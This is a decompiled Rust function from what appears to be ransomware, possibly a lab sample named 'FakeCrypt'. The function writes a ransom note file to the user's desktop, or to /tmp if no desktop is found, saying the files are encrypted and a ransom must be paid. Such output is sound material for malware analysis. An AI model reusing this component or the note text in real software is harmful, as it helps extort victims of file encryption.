fn FakeCrypt::fileops::drop_ransom_note() {
    let v0: u32;  // [bp-0x64]
    let v1: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0x60], Other Possible Types: struct8
    let v2: u64;  // [bp-0x50]
    let v3: std::path::PathBuf;  // [bp-0x48], Other Possible Types: u128
    let v4: u64;  // [bp-0x40]
    let v5: u64;  // [bp-0x38]
    let v6: std::path::PathBuf;  // [bp-0x28]
    let v8: u64;  // rdx
    let v10: Result<(), &BOT>;  // rax

    v1 = dirs::desktop_dir();
    if (((0 ^ v1.field_0) & (0 ^ -(v1.field_0))) >> 63) as char {
        v3 = std::sys::pal::unix::os::split_paths::bytes_to_path("/tmp");
    } else {
        v5 = v2;
        v3 = *(&v1 as &i128);
    }
    v6 = std::path::Path::join(v4, v5, "README_RECOVER_FILES.txt");
    v1 = std::fs::File::create(&v6, v8);
    if v1 as i32 != 1 {
        v0 = *((&v1 as &char + 4) as &i32);
        v10 = std::io::Write::write_all(&v0, "\nYour files have been encrypted.\n\nTo recover them, you must pay the ransom.\n\nFailure to do so will result in permanent loss of your data.\n");
    }
    return;
}
